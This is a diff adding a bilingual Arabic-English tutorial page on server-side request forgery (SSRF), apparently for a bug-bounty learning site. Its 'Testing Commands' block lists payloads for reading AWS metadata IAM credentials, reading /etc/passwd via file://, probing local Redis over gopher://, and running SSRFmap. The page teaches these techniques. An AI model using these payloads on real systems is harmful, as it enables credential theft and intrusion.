@@ -1,0 +1,104 @@
+{% extends "main/academy/base.html" %}
+
+{% block title %}SSRF — Server-Side Request Forgery{% endblock %}
+{% block meta_desc %}SSRF tutorial Arabic English — cloud metadata, blind SSRF, gopher protocol{% endblock %}
+{% block css_path %}/static/main/css/academy.css{% endblock %}
+{% block home_link %}../index.html{% endblock %}
+{% block methodology_link %}../methodology.html{% endblock %}
+{% block writeups_link %}../bug-bounty-writeups.html{% endblock %}
+{% block sqli_link %}sql-injection.html{% endblock %}
+{% block idor_link %}idor.html{% endblock %}
+{% block ssrf_link %}ssrf.html{% endblock %}
+{% block sqli_lab_link %}../labs/sql-injection-lab.html{% endblock %}
+{% block home_labs_link %}../index.html{% endblock %}
+{% block nav_ssrf %}active{% endblock %}
+
+{% block content %}
+<div class="page-hero">
+  <h1 class="page-title">SSRF — تزوير طلبات من جانب السيرفر</h1>
+  <p class="page-title-en">SSRF — Server-Side Request Forgery</p>
+  <span class="severity-pill pill-critical">CRITICAL</span>
+  <span class="severity-pill pill-high">OWASP A10</span>
+</div>
+
+<div class="bilingual-block">
+  <div class="lang-section">
+    <span class="lang-tag">AR</span>
+    <p><strong>SSRF</strong> تجبر السيرفر على إرسال HTTP requests لعناوين داخلية أو خارجية يختارها المهاجم — للوصول لـ cloud metadata، خدمات داخلية، أو bypass firewalls.</p>
+  </div>
+  <div class="lang-section lang-en">
+    <span class="lang-tag">EN</span>
+    <p><strong>SSRF</strong> forces the server to send HTTP requests to attacker-chosen internal or external addresses — accessing cloud metadata, internal services, or bypassing firewalls.</p>
+  </div>
+</div>
+
+<div class="section-card">
+  <h2>أنواع SSRF / SSRF Types</h2>
+  <div class="type-grid">
+    <div class="type-item">
+      <h4>Basic SSRF</h4>
+      <p>Response يظهر مباشرة — scan الشبكة الداخلية</p>
+    </div>
+    <div class="type-item">
+      <h4>Blind SSRF</h4>
+      <p>OOB detection عبر Burp Collaborator / interactsh</p>
+    </div>
+    <div class="type-item">
+      <h4>Cloud Metadata</h4>
+      <p>AWS/GCP/Azure IAM credentials من metadata endpoint</p>
+    </div>
+    <div class="type-item">
+      <h4>file:// Protocol</h4>
+      <p>قراءة ملفات محلية: <code>file:///etc/passwd</code></p>
+    </div>
+    <div class="type-item">
+      <h4>gopher://</h4>
+      <p>تفاعل مع Redis, SMTP, MySQL عبر crafted payloads</p>
+    </div>
+  </div>
+</div>
+
+<div class="section-card">
+  <h2>أوامر الاختبار / Testing Commands</h2>
+  <div class="cmd-block">
+    <pre># AWS Metadata
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+# File read
+file:///etc/passwd
+
+# Gopher → Redis
+gopher://127.0.0.1:6379/_INFO
+
+# SSRFmap automated
+python ssrfmap.py -r request.txt -p url</pre>
+    <div class="cmd-footer"><button class="copy-btn" onclick="copyCmd(this)">📋 Copy</button></div>
+  </div>
+</div>
+
+<div class="section-card">
+  <h2>الأدوات / Tools</h2>
+  <div class="tools-row">
+    <span class="tool-chip">SSRFmap</span>
+    <span class="tool-chip">Gopherus</span>
+    <span class="tool-chip">Burp Collaborator</span>
+    <span class="tool-chip">interactsh</span>
+  </div>
+</div>
+
+<div class="section-card">
+  <h2>Writeup & Lab</h2>
+  <div class="bilingual-block">
+    <div class="lang-section">
+      <span class="lang-tag">AR</span>
+      <p>Writeup: <strong>SSRF in Modern Cloud: From Recon to RCE</strong></p>
+    </div>
+    <div class="lang-section lang-en">
+      <span class="lang-tag">EN</span>
+      <p>Writeup: <strong>SSRF in Modern Cloud: From Recon to RCE</strong></p>
+    </div>
+  </div>
+  <a class="cta-lab" href="../labs/ssrf-lab.html" style="opacity:0.6;pointer-events:none;">🧪 SSRF Lab — قريباً / Coming Soon</a>
+</div>
+{% endblock %}
